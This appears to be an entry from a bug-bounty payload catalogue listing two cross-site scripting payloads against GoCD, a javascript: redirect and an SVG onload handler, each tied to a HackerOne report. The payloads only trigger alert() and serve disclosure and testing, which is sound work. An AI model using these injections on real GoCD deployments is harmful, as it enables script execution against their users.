# GoCD

2 payloads.

### `00f1271b`

```
?redirect_to=javascript:alert("XSS")
```

**Parameter:** `redirect_to`
— [XSS in new.loading.page.html](https://hackerone.com/reports/2419227) · GoCD · [aviv_keller](https://hackerone.com/aviv_keller)

### `18b387d2`

```
<svg/onload=alert("XSS") >
```

**Parameter:** `msg`
— [XSS in GOCD Analytics Plugin](https://hackerone.com/reports/2433634) · GoCD · [aviv_keller](https://hackerone.com/aviv_keller)
